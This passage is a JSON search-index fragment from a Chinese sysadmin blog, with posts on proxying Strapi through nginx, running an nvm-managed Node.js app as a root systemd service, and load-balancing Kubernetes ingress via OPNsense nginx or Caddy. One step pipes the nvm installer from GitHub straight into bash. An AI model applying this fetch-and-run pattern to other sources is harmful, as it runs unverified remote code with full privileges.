/usr/local/bin/certs/certificates/blog.rendoumi.com.crt\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate_key /usr/local/bin/certs/certificates/blog.rendoumi.com.key\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Proxy Config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass http://strapi\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_http_version 1.1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Server \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Real-IP \u003cspan class=\"nv\"\u003e$remote_addr\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header X-Forwarded-Proto \u003cspan class=\"nv\"\u003e$scheme\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Host \u003cspan class=\"nv\"\u003e$http_host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Upgrade \u003cspan class=\"nv\"\u003e$http_upgrade\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_set_header Connection \u003cspan class=\"s2\"\u003e\u0026#34;Upgrade\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        proxy_pass_request_headers on\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data/strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyarn develop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后登录就可以了，诡异的是第四步，如果不gen vite.config.ts，那nginx代理访问local host:1337上会出问题。\u003c/p\u003e","title":"strapi的安装"},{"content":"有很多next、nuxt、yarn的nodejs程序，都是什么npm start或者yarn develop的启动模式，如何搞成systemd的服务呢，这里面麻烦的就是systemd的服务需要使用全路径。\n那方法如下：\n一、安装nvm curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash 二、安装nodejs和yarn source ~/.nvm/nvm.sh nvm ls-remote nvm install v20.19.5 node -v npm install -g yarn npm list -g 三、弄strapi.service服务 echo $NVM_DIR # 确定 nvm 的安装目录 /root/.nvm which node # 确定 Node.js 的路径 /root/.nvm/versions/node/v20.19.5/bin/node which yarn # 确定 Yarn 的路径 /root/.nvm/versions/node/v20.19.5/bin/yarn cat \u0026lt; EOF \u0026gt; /etc/systemd/system/strapi.service [Unit] Description=Strapi App After=network.target [Service] # 使用用户账户运行服务，替换为实际的用户名 User=root Group=root # 指定工作目录，替换为项目的实际路径 WorkingDirectory=/data/strapi # 加载 nvm 并运行 yarn 或 node Environment=\u0026#34;NVM_DIR=/root/.nvm\u0026#34; ExecStart=/bin/bash -c \u0026#34;. $NVM_DIR/nvm.sh \u0026amp;\u0026amp; yarn develop\u0026#34; Restart=always RestartSec=10 [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now strapi ","permalink":"https://rendoumi.com/posts/20251015-nodejs_systemctl/","summary":"\u003cp\u003e有很多next、nuxt、yarn的nodejs程序，都是什么\u003ccode\u003enpm start\u003c/code\u003e或者\u003ccode\u003eyarn develop\u003c/code\u003e的启动模式，如何搞成systemd的服务呢，这里面麻烦的就是systemd的服务需要使用全路径。\u003c/p\u003e\n\u003cp\u003e那方法如下：\u003c/p\u003e\n\u003ch5 id=\"一安装nvm\"\u003e一、安装nvm\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二安装nodejs和yarn\"\u003e二、安装nodejs和yarn\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v20.19.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm list -g\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三弄strapiservice服务\"\u003e三、弄strapi.service服务\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$NVM_DIR\u003c/span\u003e     \u003cspan class=\"c1\"\u003e# 确定 nvm 的安装目录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhich node        \u003cspan class=\"c1\"\u003e# 确定 Node.js 的路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm/versions/node/v20.19.5/bin/node\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhich yarn        \u003cspan class=\"c1\"\u003e# 确定 Yarn 的路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/root/.nvm/versions/node/v20.19.5/bin/yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026lt; EOF \u0026gt; /etc/systemd/system/strapi.service \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eStrapi App\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 使用用户账户运行服务，替换为实际的用户名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eGroup\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 指定工作目录，替换为项目的实际路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWorkingDirectory\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 加载 nvm 并运行 yarn 或 node\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eEnvironment\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;NVM_DIR=/root/.nvm\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/bin/bash -c \u003cspan class=\"s2\"\u003e\u0026#34;. \u003c/span\u003e\u003cspan class=\"nv\"\u003e$NVM_DIR\u003c/span\u003e\u003cspan class=\"s2\"\u003e/nvm.sh \u0026amp;\u0026amp; yarn develop\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ealways\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestartSec\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEOF\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e --now strapi\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"NVM管理的Nodejs如何做成systemd的serivce服务"},{"content":"新托管了一个机房服务器，基本全用开源软件来构建：\n那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\n结构图如下，证书是放在了Nginx ingres上：\n那方法有很多，各有利弊，说下第三个，Nginx的做法\nrelayd和caddy都说完了，那还有Nginx，Nginx的话，如果证书挂在OPNsense，那就可以用WAF的功能\n如果证书放在后端Kubernetes的Nginx ingress上，那就无法用WAF了，算是data stream\n那提前说一句，Nginx的配置是有Bug的，如果无法清除干净，需要ssh登录opnsense，然后\n把 /conf/下xml配置文件中的 nginx 部分删除掉，然后重启服务器，才可以\nos-nginx的配置方法如下：\n第一步：首先去Upstream的Upstream Server子标签，建立两组服务器\n第二步：再去Upstream的Upstream子标签，建立两组服务\n建立的时候advanced mode要打开，PROXY Protocol要选中，Server选中各自的4个服务器，其它保持缺省即可。\n第三步：去Data Streams的子标签Stream Servers，建两组服务\n编辑一下，监听端口只选指定IP的80和443，PROXY Protocol不要选中，然后Route就选Upstream，Upstream Servers选中对应的，其它缺省即可。\n那对应的，后端Kubernetes的Nginx ingress也要做相应配置\nNginx ingress的configmap，需要加上Proxy Protocol的部分\n我们用的是官网的 ingress-nginx，配置文件是 ingress-nginx 的namespace中\nconfigmap ingress-nginx-controller，内容如下，对应data那两行：\napiVersion: v1 data: use-proxy-protocol: \u0026#34;true\u0026#34; kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: ingress-nginx meta.helm.sh/release-namespace: ingress-nginx nginx.ingress.kubernetes.io/configuration-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/location-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/server-snippet: \u0026#34;true\u0026#34; creationTimestamp: \u0026#34;2025-08-27T07:38:49Z\u0026#34; labels: app.kubernetes.io/component: controller app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx app.kubernetes.io/version: 1.13.1 helm.sh/chart: ingress-nginx-4.13.1 name: ingress-nginx-controller namespace: ingress-nginx resourceVersion: \u0026#34;22298827\u0026#34; uid: d6eeef3c-7e44-4667-854a-c7693006b221 编辑后，nginx ingress会自动reload\n最后去OPNsense os-nginx的配置：General Settings去Enable nginx选中，然后Apply即可\n这样就很完美了，后端的Nginx ingress也可以获得真实客户端IP了，看看nginx的log确认一下。\n注意：relayd和caddy和Nginx不能同时启动。\n","permalink":"https://rendoumi.com/posts/20251014-opensense_nginx/","summary":"\u003cp\u003e新托管了一个机房服务器，基本全用开源软件来构建：\u003c/p\u003e\n\u003cp\u003e那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\u003c/p\u003e\n\u003cp\u003e结构图如下，证书是放在了Nginx ingres上：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那方法有很多，各有利弊，说下第三个，\u003ccode\u003eNginx\u003c/code\u003e的做法\u003c/p\u003e\n\u003cp\u003erelayd和caddy都说完了，那还有Nginx，Nginx的话，如果证书挂在OPNsense，那就可以用WAF的功能\u003c/p\u003e\n\u003cp\u003e如果证书放在后端Kubernetes的Nginx ingress上，那就无法用WAF了，算是data stream\u003c/p\u003e\n\u003cp\u003e那提前说一句，Nginx的配置是有Bug的，如果无法清除干净，需要ssh登录opnsense，然后\u003c/p\u003e\n\u003cp\u003e把 /conf/下xml配置文件中的 nginx 部分删除掉，然后重启服务器，才可以\u003c/p\u003e\n\u003cp\u003eos-nginx的配置方法如下：\u003c/p\u003e\n\u003cp\u003e第一步：首先去Upstream的Upstream Server子标签，建立两组服务器\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103525587\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103525587.png\"\u003e\u003c/p\u003e\n\u003cp\u003e第二步：再去Upstream的Upstream子标签，建立两组服务\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103800452\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103800452.png\"\u003e\u003c/p\u003e\n\u003cp\u003e建立的时候advanced mode要打开，PROXY Protocol要选中，Server选中各自的4个服务器，其它保持缺省即可。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014103913320\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014103913320.png\"\u003e\u003c/p\u003e\n\u003cp\u003e第三步：去Data Streams的子标签Stream Servers，建两组服务\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014104039907\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014104039907.png\"\u003e\u003c/p\u003e\n\u003cp\u003e编辑一下，监听端口只选指定IP的80和443，PROXY Protocol不要选中，然后Route就选Upstream，Upstream Servers选中对应的，其它缺省即可。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014104150653\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014104150653.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那对应的，后端Kubernetes的Nginx ingress也要做相应配置\u003c/p\u003e\n\u003cp\u003eNginx ingress的configmap，需要加上Proxy Protocol的部分\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095327561\" loading=\"lazy\" src=\"/posts/20251014-opensense_nginx/image-20251014095327561.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们用的是官网的 ingress-nginx，配置文件是 ingress-nginx 的namespace中\u003c/p\u003e\n\u003cp\u003econfigmap ingress-nginx-controller，内容如下，对应data那两行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  use-proxy-protocol: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ConfigMap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/configuration-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/location-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/server-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  creationTimestamp: \u003cspan class=\"s2\"\u003e\u0026#34;2025-08-27T07:38:49Z\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/component: controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/instance: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/managed-by: Helm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/part-of: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/version: 1.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    helm.sh/chart: ingress-nginx-4.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: ingress-nginx-controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resourceVersion: \u003cspan class=\"s2\"\u003e\u0026#34;22298827\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  uid: d6eeef3c-7e44-4667-854a-c7693006b221\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑后，nginx ingress会自动reload\u003c/p\u003e","title":"OPNsense如何做LoadBalance接入后端的Kubernetes nginx ingress --- Nginx篇"},{"content":"新托管了一个机房服务器，基本全用开源软件来构建：\n那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\n结构图如下，证书是放在了Nginx ingres上：\n那方法有很多，各有利弊，说下第二个，Caddy的做法\nCaddy真的是王道，什么泛域名，一个端口跑3个协议，都可以\n用到Caddy，就要解决后端Nginx ingress无法获得客户真实IP的问题\nCaddy配置如下：\nGeneral Settings：\nEnable Layer4 Proxy 要勾选上\nAuto HTTPS 要选中Off\n其它保持默认，然后去到Layer4 Proxy进行配置，同样要配2个，一个HTTP，一个TLS\n编辑HTTP的代理，注意 Domain 的地方需要把用到的所有域名列进去\n编译TLS的代理\n注意上面，Proxy Protocol都要选中v2，这样客户端真实IP才可以透传给后端的Nginx ingress\n那同样后端的Nginx ingress的configmap，也需要加上Proxy Protocol的部分\n我们用的是官网的 ingress-nginx，配置文件是 ingress-nginx 的namespace中\nconfigmap ingress-nginx-controller，内容如下\napiVersion: v1 data: use-proxy-protocol: \u0026#34;true\u0026#34; kind: ConfigMap metadata: annotations: meta.helm.sh/release-name: ingress-nginx meta.helm.sh/release-namespace: ingress-nginx nginx.ingress.kubernetes.io/configuration-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/location-snippet: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/server-snippet: \u0026#34;true\u0026#34; creationTimestamp: \u0026#34;2025-08-27T07:38:49Z\u0026#34; labels: app.kubernetes.io/component: controller app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/managed-by: Helm app.kubernetes.io/name: ingress-nginx app.kubernetes.io/part-of: ingress-nginx app.kubernetes.io/version: 1.13.1 helm.sh/chart: ingress-nginx-4.13.1 name: ingress-nginx-controller namespace: ingress-nginx resourceVersion: \u0026#34;22298827\u0026#34; uid: d6eeef3c-7e44-4667-854a-c7693006b221 编辑后，nginx ingress会自动reload\n然后去OPNsense Caddy的General Settings，配置生效\n这样就很完美了，后端的Nginx ingress也可以获得真实客户端IP了，看看nginx的log确认一下。\n注意：relayd和caddy不能同时启动。\n","permalink":"https://rendoumi.com/posts/20251014-opnsense_caddy/","summary":"\u003cp\u003e新托管了一个机房服务器，基本全用开源软件来构建：\u003c/p\u003e\n\u003cp\u003e那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\u003c/p\u003e\n\u003cp\u003e结构图如下，证书是放在了Nginx ingres上：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那方法有很多，各有利弊，说下第二个，\u003ccode\u003eCaddy\u003c/code\u003e的做法\u003c/p\u003e\n\u003cp\u003eCaddy真的是王道，什么泛域名，一个端口跑3个协议，都可以\u003c/p\u003e\n\u003cp\u003e用到Caddy，就要解决后端Nginx ingress无法获得客户真实IP的问题\u003c/p\u003e\n\u003cp\u003eCaddy配置如下：\u003c/p\u003e\n\u003cp\u003eGeneral Settings：\u003c/p\u003e\n\u003cp\u003eEnable Layer4 Proxy 要勾选上\u003c/p\u003e\n\u003cp\u003eAuto HTTPS 要选中Off\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094437866\" loading=\"lazy\" 